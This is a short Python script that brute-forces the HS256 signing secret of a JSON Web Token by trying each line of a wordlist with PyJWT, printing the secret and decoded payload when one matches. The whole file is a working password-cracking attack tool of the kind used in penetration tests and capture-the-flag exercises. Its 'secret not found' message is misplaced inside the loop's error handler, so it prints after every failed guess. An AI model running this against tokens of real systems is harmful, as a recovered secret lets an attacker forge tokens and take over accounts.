import jwt
from jwt.exceptions import InvalidSignatureError

token = input("Enter token to brute-force: ")
wordlist_path = input("Enter path to wordlist: ")
def brute_force_jwt(token, wordlist_path):
    header, payload, signature = token.split('.')
    with open(wordlist_path, "r") as file:
        for secret in file:
            secret = secret.strip()
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                print(f"\n [+] secret found: {secret}")
                print(" [+] payload:", decoded)
                return
            except InvalidSignatureError:
                print(f" [-] tried secret: {secret}")
                print("\n[-] secret not found in wordlist")
brute_force_jwt(token, wordlist_path)
